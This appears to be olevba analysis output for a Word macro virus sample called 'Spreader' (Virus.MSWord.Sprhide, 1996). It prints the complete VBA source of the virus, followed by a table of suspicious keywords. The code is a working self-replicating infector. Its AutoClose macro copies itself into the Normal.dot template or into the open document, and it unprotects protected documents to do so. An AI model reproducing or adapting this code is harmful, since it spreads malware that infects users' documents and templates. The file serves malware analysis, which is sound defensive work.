olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Sprhide-79e8312af986beeb0d158effeab08dc3427c92d1
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Sprhide-79e8312af986beeb0d158effeab08dc3427c92d1 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoClose.bas 
in file: Virus.MSWord.Sprhide-79e8312af986beeb0d158effeab08dc3427c92d1 - OLE stream: 'Macros/VBA/AutoClose'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Spreader macro August 1996\r\n"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "Normal.AutoClose.MAIN"
Dim me_$
Dim Filenaam$
' -------------------------------------------------------------------------
' DOOMSDAY WARRIOR MS WORD MACRO CONTAMINATION
' --------------------------------------------08/23/1996-------------------
On Error Resume Next
me_$ = "AutoClose"
    'Filenaam$ = Bestandsnaam$(0)
    'If Right$(filenaam$, 1) = "." Then filenaam$ = filenaam$ + "DOC"
    'BestandOpslaanAls .Naam = Filenaam$, .Indeling = 1, .AlleenAantekeningen = 0, .Wachtwoord = "", .AanLaatstGebrToev = 1, .SchrijfWachtwoord = "", .AlleenLezenAanb = 0, .LettertypenInsluiten = 0, .OrigineleFigIndeling = 0, .GegevensFormulieren = 0



Filenaam$ = WordBasic.[FileName$](0)
CopyMe (Filenaam$)
End Sub

Private Sub CopyMe(doc$)
Dim true_
Dim false_
Dim Normalpath$
Dim Activedoc$
Dim me_$
Dim from$
Dim to_$
Dim tostandard
Dim secured
    true_ = 1
    false_ = 0
    Dim locations As Object: Set locations = WordBasic.DialogRecord.ToolsOptionsFileLocations(False)
    locations.Path = "USER-DOT-PATH"
    WordBasic.CurValues.ToolsOptionsFileLocations locations
    Normalpath$ = locations.Setting
    If Normalpath$ = "" Then
        locations.Path = "STARTUP-PATH"
        WordBasic.CurValues.ToolsOptionsFileLocations locations
        Normalpath$ = locations.Setting
    End If
        Activedoc$ = WordBasic.[FileName$](0)
    me_$ = "AutoClose"
    from$ = WordBasic.[MacroFileName$]()
    to_$ = Normalpath$ + "\Normal.dot"
    tostandard = true_
    If UCase(from$) = UCase(to_$) Then
        to_$ = doc$
        tostandard = false_
    End If
    On Error Resume Next
    If UCase(Environ("VIRUSCOMMENT")) = "YES" Then WordBasic.MsgBox "Src: " + from$ + Chr(13) + Chr(10) + "Dst: " + to_$ + Chr(13) + Chr(10) + "To standard normal.dot: " + Str(tostandard) + ".", "MS Word internal save info: " + me_$ + " VirComment.", 64
    On Error Resume Next
    secured = WordBasic.DocumentProtection()
    If secured <> 0 Then WordBasic.ToolsUnprotectDocument
    On Error Resume Next
    WordBasic.Organizer Copy:=1, Source:=from$, Destination:=to_$, Name:=me_$, Tab:=3
    If secured <> 0 Then WordBasic.ToolsProtectDocument DocumentPassword:="", NoReset:=0, Type:=2
    If tostandard = false_ Then
        WordBasic.FileSaveAs Name:=to_$, Format:=1, LockAnnot:=0, Password:="", AddToMru:=1, WritePassword:="", RecommendReadOnly:=0, EmbedFonts:=0, NativePictureFormat:=0, FormsData:=0
    Else
        WordBasic.FileSaveAll   'Save standard normal.dot this way.
    End If
        If UCase(WordBasic.[Right$](to_$, 10)) = "NORMAL.DOT" Then WordBasic.FileTemplates Store:=0, Template:="NORMAL.DOT", LinkStyles:=0
    If UCase(Environ("SPREADERHIDE")) <> "YES" Then SayHello
End Sub

Private Sub SayHello()
Dim tel
    If WordBasic.Today() Mod 7 = 6 Then
        'We're Friday!
        WordBasic.Beep 48
        WordBasic.MsgBox "Spreader wishes you a good friday.", "Speader August 1996", 64
        WordBasic.WaitCursor 1
        For tel = 0 To 10000
        Next tel
        WordBasic.WaitCursor 0
    End If
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Environ             |May read system environment variables        |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

